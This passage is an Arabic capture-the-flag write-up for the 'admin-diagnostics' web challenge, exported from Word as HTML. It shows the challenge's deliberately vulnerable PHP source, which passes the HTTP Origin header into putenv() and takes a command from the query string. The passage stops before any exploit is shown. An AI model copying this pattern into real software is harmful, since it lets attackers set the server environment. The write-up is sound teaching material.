@@ -1,0 +1,1586 @@
+<html>
+
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=utf-8">
+<meta name=Generator content="Microsoft Word 15 (filtered)">
+<style>
+<!--
+ /* Font Definitions */
+ @font-face
+	{font-family:Wingdings;
+	panose-1:5 0 0 0 0 0 0 0 0 0;}
+@font-face
+	{font-family:"Cambria Math";
+	panose-1:2 4 5 3 5 4 6 3 2 4;}
+@font-face
+	{font-family:Calibri;
+	panose-1:2 15 5 2 2 2 4 3 2 4;}
+ /* Style Definitions */
+ p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{margin:0cm;
+	margin-bottom:.0001pt;
+	font-size:12.0pt;
+	font-family:"Times New Roman",serif;}
+h2
+	{mso-style-link:"Heading 2 Char";
+	margin-right:0cm;
+	margin-left:0cm;
+	font-size:18.0pt;
+	font-family:"Times New Roman",serif;}
+a:link, span.MsoHyperlink
+	{color:#0563C1;
+	text-decoration:underline;}
+a:visited, span.MsoHyperlinkFollowed
+	{color:#954F72;
+	text-decoration:underline;}
+code
+	{font-family:"Courier New";}
+p.MsoListParagraph, li.MsoListParagraph, div.MsoListParagraph
+	{margin-top:0cm;
+	margin-right:0cm;
+	margin-bottom:0cm;
+	margin-left:36.0pt;
+	margin-bottom:.0001pt;
+	font-size:12.0pt;
+	font-family:"Calibri",sans-serif;}
+p.MsoListParagraphCxSpFirst, li.MsoListParagraphCxSpFirst, div.MsoListParagraphCxSpFirst
+	{margin-top:0cm;
+	margin-right:0cm;
+	margin-bottom:0cm;
+	margin-left:36.0pt;
+	margin-bottom:.0001pt;
+	font-size:12.0pt;
+	font-family:"Calibri",sans-serif;}
+p.MsoListParagraphCxSpMiddle, li.MsoListParagraphCxSpMiddle, div.MsoListParagraphCxSpMiddle
+	{margin-top:0cm;
+	margin-right:0cm;
+	margin-bottom:0cm;
+	margin-left:36.0pt;
+	margin-bottom:.0001pt;
+	font-size:12.0pt;
+	font-family:"Calibri",sans-serif;}
+p.MsoListParagraphCxSpLast, li.MsoListParagraphCxSpLast, div.MsoListParagraphCxSpLast
+	{margin-top:0cm;
+	margin-right:0cm;
+	margin-bottom:0cm;
+	margin-left:36.0pt;
+	margin-bottom:.0001pt;
+	font-size:12.0pt;
+	font-family:"Calibri",sans-serif;}
+span.Heading2Char
+	{mso-style-name:"Heading 2 Char";
+	mso-style-link:"Heading 2";
+	font-family:"Times New Roman",serif;
+	font-weight:bold;}
+span.css-901oao
+	{mso-style-name:css-901oao;}
+span.dc-title
+	{mso-style-name:dc-title;}
+span.st
+	{mso-style-name:st;}
+@page WordSection1
+	{size:595.0pt 842.0pt;
+	margin:72.0pt 72.0pt 72.0pt 72.0pt;}
+div.WordSection1
+	{page:WordSection1;}
+ /* List Definitions */
+ ol
+	{margin-bottom:0cm;}
+ul
+	{margin-bottom:0cm;}
+-->
+</style>
+
+</head>
+
+<body lang=EN-US link="#0563C1" vlink="#954F72">
+
+<div class=WordSection1>
+
+<h2 align=center dir=RTL style='text-align:center;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:16.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black;background:yellow'>شرح حل
+تحدي </span><a href="%10https:/ctf.wes4m.io/challenges#admin-diagnostics"><span
+dir=LTR style='font-size:16.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black;background:yellow'>admin-diagnostics</span></a></h2>
+
+<h2 dir=RTL style='text-align:right;line-height:115%;direction:rtl;unicode-bidi:
+embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'>&nbsp;</span></h2>
+
+<h2 dir=RTL style='text-align:right;line-height:115%;direction:rtl;unicode-bidi:
+embed'><span lang=AR-SA style='font-size:14.0pt;line-height:115%;font-family:
+"Calibri",sans-serif;color:black'>التحدي:</span><span lang=AR-SA
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black;font-weight:normal'> </span><span style='font-size:14.0pt;
+line-height:115%;font-family:"Calibri",sans-serif;color:black'><a
+href="%10https:/ctf.wes4m.io/challenges#admin-diagnostics"><span dir=LTR
+style='color:black'>admin-diagnostics</span></a></span></h2>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><b><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>بواسطة: </span></b><a
+href="https://twitter.com/zawessam"><span dir=LTR style='font-size:14.0pt;
+line-height:115%;font-family:"Calibri",sans-serif'>wes4m</span></a></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><b><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></b></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><b><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></b></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><b><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:#C00000'>ملاحظات مُهمة جدًا قبل أن
+تكمل قراءة المقالة! </span></b></p>
+
+<p class=MsoListParagraphCxSpFirst dir=RTL style='margin-top:0cm;margin-right:
+36.0pt;margin-bottom:0cm;margin-left:0cm;margin-bottom:.0001pt;text-align:right;
+text-indent:-18.0pt;line-height:115%;direction:rtl;unicode-bidi:embed'><b><span
+lang=EN-GB style='font-size:14.0pt;line-height:115%;font-family:Symbol;
+color:black'>·<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></b><span dir=RTL></span><b><span lang=AR-SA style='font-size:
+14.0pt;line-height:115%;color:black'>في حال لم تبدأ بحل التحدي: </span></b></p>
+
+<p class=MsoListParagraphCxSpMiddle dir=RTL style='margin-top:0cm;margin-right:
+54.0pt;margin-bottom:0cm;margin-left:0cm;margin-bottom:.0001pt;text-align:right;
+text-indent:-18.0pt;line-height:115%;direction:rtl;unicode-bidi:embed'><span
+lang=EN-GB style='font-size:14.0pt;line-height:115%;font-family:"Courier New";
+color:black'>o<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span><span dir=RTL></span><span lang=AR-SA style='font-size:14.0pt;
+line-height:115%;color:black'>التحدي يستحق المحاولة! ؛ في كل مرحلة منه ستواجه
+أمور تستدعي منك البحث عنها وفهمها حتى تتجاوزها، باختصار ستُنهي حل التحدي بمعرفة
+جيدة حول بعض الأشياء التي رُبما كنت تجهلها، <b>فلا تفوّت فرصة التعلّم و
+&quot;حاول&quot;</b> أن تقوم بحله قبل الاطلاع على الحل. </span></p>
+
+<p class=MsoListParagraphCxSpMiddle dir=RTL style='margin-top:0cm;margin-right:
+36.0pt;margin-bottom:0cm;margin-left:0cm;margin-bottom:.0001pt;text-align:right;
+text-indent:-18.0pt;line-height:115%;direction:rtl;unicode-bidi:embed'><b><span
+lang=EN-GB style='font-size:14.0pt;line-height:115%;font-family:Symbol;
+color:black'>·<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></b><span dir=RTL></span><b><span lang=AR-SA style='font-size:
+14.0pt;line-height:115%;color:black'>في حال بدأت في حله لكن توقفت عند مرحلة
+معينة:</span></b></p>
+
+<p class=MsoListParagraphCxSpMiddle dir=RTL style='margin-top:0cm;margin-right:
+54.0pt;margin-bottom:0cm;margin-left:0cm;margin-bottom:.0001pt;text-align:right;
+text-indent:-18.0pt;line-height:115%;direction:rtl;unicode-bidi:embed'><span
+style='font-size:14.0pt;line-height:115%;font-family:"Courier New";color:black'>o<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp; </span></span><span
+dir=RTL></span><span lang=AR-SA style='font-size:14.0pt;line-height:115%;
+color:black'> سأقوم بوضع بعض الـ </span><span dir=LTR style='font-size:14.0pt;
+line-height:115%;color:black'>Hint </span><span dir=RTL></span><span
+lang=AR-SA style='font-size:14.0pt;line-height:115%;color:black'><span dir=RTL></span> قبل
+شرح أي مرحلة في التحدي، اطلع عليها في حال احتجت المساعدة ثم انطلق من بعدها</span><span
+lang=AR-SA style='font-size:14.0pt;line-height:115%;color:black'>.</span></p>
+
+<p class=MsoListParagraphCxSpMiddle dir=RTL style='margin-top:0cm;margin-right:
+36.0pt;margin-bottom:0cm;margin-left:0cm;margin-bottom:.0001pt;text-align:right;
+text-indent:-18.0pt;line-height:115%;direction:rtl;unicode-bidi:embed'><b><span
+lang=EN-GB style='font-size:14.0pt;line-height:115%;font-family:Symbol;
+color:black'>·<span style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+</span></span></b><span dir=RTL></span><b><span lang=AR-SA style='font-size:
+14.0pt;line-height:115%;color:black'>مهارات/أدوات تحتاجها لحل التحدي (حسب
+الطريقة التي اتبعتها): </span></b></p>
+
+<p class=MsoListParagraphCxSpMiddle dir=RTL style='margin-top:0cm;margin-right:
+54.0pt;margin-bottom:0cm;margin-left:0cm;margin-bottom:.0001pt;text-align:right;
+text-indent:-18.0pt;line-height:115%;direction:rtl;unicode-bidi:embed'><span
+style='font-size:14.0pt;line-height:115%;font-family:"Courier New";color:black'>o<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp; </span></span><span
+dir=RTL></span><span dir=LTR style='font-size:14.0pt;line-height:115%;
+color:black'>PHP</span></p>
+
+<p class=MsoListParagraphCxSpMiddle dir=RTL style='margin-top:0cm;margin-right:
+54.0pt;margin-bottom:0cm;margin-left:0cm;margin-bottom:.0001pt;text-align:right;
+text-indent:-18.0pt;line-height:115%;direction:rtl;unicode-bidi:embed'><span
+style='font-size:14.0pt;line-height:115%;font-family:"Courier New";color:black'>o<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp; </span></span><span
+dir=RTL></span><span dir=LTR style='font-size:14.0pt;line-height:115%;
+color:black'>C </span></p>
+
+<p class=MsoListParagraphCxSpMiddle dir=RTL style='margin-top:0cm;margin-right:
+54.0pt;margin-bottom:0cm;margin-left:0cm;margin-bottom:.0001pt;text-align:right;
+text-indent:-18.0pt;line-height:115%;direction:rtl;unicode-bidi:embed'><span
+style='font-size:14.0pt;line-height:115%;font-family:"Courier New";color:black'>o<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp; </span></span><span
+dir=RTL></span><span lang=AR-SA style='font-size:14.0pt;line-height:115%;
+color:black'>التعامل مع </span><span dir=LTR></span><span dir=LTR
+style='font-size:14.0pt;line-height:115%;color:black'><span dir=LTR></span> Burp
+Suit </span><span lang=AR-SA style='font-size:14.0pt;line-height:115%;
+color:black'>أو أي أداة تؤدي نفس الغرض </span></p>
+
+<p class=MsoListParagraphCxSpMiddle dir=RTL style='margin-top:0cm;margin-right:
+54.0pt;margin-bottom:0cm;margin-left:0cm;margin-bottom:.0001pt;text-align:right;
+text-indent:-18.0pt;line-height:115%;direction:rtl;unicode-bidi:embed'><span
+style='font-size:14.0pt;line-height:115%;font-family:"Courier New";color:black'>o<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp; </span></span><span
+dir=RTL></span><span lang=AR-SA style='font-size:14.0pt;line-height:115%;
+color:black'>صبر<sup>٤</sup></span></p>
+
+<p class=MsoListParagraphCxSpLast dir=RTL style='margin-top:0cm;margin-right:
+54.0pt;margin-bottom:0cm;margin-left:0cm;margin-bottom:.0001pt;text-align:right;
+text-indent:-18.0pt;line-height:115%;direction:rtl;unicode-bidi:embed'><span
+style='font-size:14.0pt;line-height:115%;font-family:"Courier New";color:black'>o<span
+style='font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&nbsp; </span></span><span
+dir=RTL></span><span lang=AR-SA style='font-size:14.0pt;line-height:115%;
+color:black'>كوبين قهوة </span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>بعد الدخول على صفحة التحدي،
+نجد هذه الصفحة</span><span dir=LTR></span><span dir=LTR style='font-size:14.0pt;
+line-height:115%;font-family:"Calibri",sans-serif;color:black'><span dir=LTR></span>:</span><span
+dir=RTL></span><span style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'><span dir=RTL></span> </span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><img width=451 height=216
+src="admin-diagnostics-WRITEUP.fld/image001.png" align=right hspace=12></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>نلاحظ أن الصفحة تقترح علينا
+إدخال الأمر: </span><span dir=LTR></span><span lang=AR-SA dir=LTR
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'><span dir=LTR></span> </span><b><span dir=LTR style='font-size:
+14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:black'>source</span></b><span
+dir=LTR style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'> </span><span lang=AR-SA style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>لمعرفة الكود المصدري ، نُدخل
+الأمر </span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><img width=451 height=227
+src="admin-diagnostics-WRITEUP.fld/image002.png" align=right hspace=12></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>&nbsp;</span></p>
+
+<p class=MsoNormal dir=RTL style='text-align:right;line-height:115%;direction:
+rtl;unicode-bidi:embed'><span lang=AR-SA style='font-size:14.0pt;line-height:
+115%;font-family:"Calibri",sans-serif;color:black'>بعد إرسال الأمر سنجد كُود
+الـ </span><b><span dir=LTR style='font-size:14.0pt;line-height:115%;
+font-family:"Calibri",sans-serif;color:black'>PHP</span></b><span dir=LTR
+style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+color:black'> </span><span dir=RTL></span><span lang=AR-SA style='font-size:
+14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:black'><span
+dir=RTL></span> التالي: </span></p>
+
+<div align=right>
+
+<table class=MsoTableGrid dir=rtl border=1 cellspacing=0 cellpadding=0
+ style='margin-left:515.05pt;border-collapse:collapse;border:none'>
+ <tr>
+  <td width=604 valign=top style='width:453.2pt;border:solid windowtext 1.0pt;
+  padding:0cm 5.4pt 0cm 5.4pt'>
+  <p class=MsoNormal dir=LTR style='line-height:115%'><span dir=LTR></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'><span dir=LTR></span>&lt;?php</span></code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'><br>
+  <br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;session_start</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'>();</span></code><span style='font-size:14.0pt;line-height:
+  115%;font-family:"Calibri",sans-serif;color:#007700'><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;include(</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#DD0000'>'funcs.php'</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>);</span></code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'><br>
+  <br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;if(!isset(</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>$_SESSION</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>[</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#DD0000'>&quot;dir&quot;</span></code><code><span style='font-size:
+  14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>]))&nbsp;{</span></code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>$tmpDir&nbsp;</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>=&nbsp;</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#DD0000'>&quot;./tmp/&quot;&nbsp;</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'>.&nbsp;</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#0000BB'>random_string</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'>(</span></code><code><span style='font-size:14.0pt;line-height:
+  115%;font-family:"Calibri",sans-serif;color:#0000BB'>32</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'>);</span></code><span style='font-size:14.0pt;line-height:
+  115%;font-family:"Calibri",sans-serif;color:#007700'><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>mkdir</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>(</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>$tmpDir</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>);</span></code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>$_SESSION</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>[</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#DD0000'>&quot;dir&quot;</span></code><code><span style='font-size:
+  14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>]&nbsp;=&nbsp;</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>$tmpDir</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>;</span></code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;}</span></code><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;</span></code><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;function&nbsp;</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>enable_diagnostics</span></code><code><span style='font-size:
+  14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>()&nbsp;{</span></code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>putenv</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>(</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#DD0000'>&quot;</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>{</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>$_SERVER</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>[</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#DD0000'>'HTTP_ORIGIN'</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>]}</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#DD0000'>_ENABLE_DIAGNOSTICS=1&quot;</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'>);</span></code><span style='font-size:14.0pt;line-height:
+  115%;font-family:"Calibri",sans-serif;color:#007700'><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;}</span></code><br>
+  <br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>$command&nbsp;</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>=&nbsp;</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>$_GET</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>[</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#DD0000'>'command'</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>]&nbsp;.&nbsp;</span></code><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#DD0000'>&quot;&nbsp;&quot;</span></code><code><span style='font-size:
+  14.0pt;line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>;</span></code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'><br>
+  <code><span style='line-height:115%;font-family:"Calibri",sans-serif'>&nbsp;&nbsp;&nbsp;&nbsp;if(isset(</span></code></span><code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#0000BB'>$command</span></code><code><span style='font-size:14.0pt;
+  line-height:115%;font-family:"Calibri",sans-serif;color:#007700'>))&nbsp;{</span></code><span
+  style='font-size:14.0pt;line-height:115%;font-family:"Calibri",sans-serif;
+  color:#007700'><br>
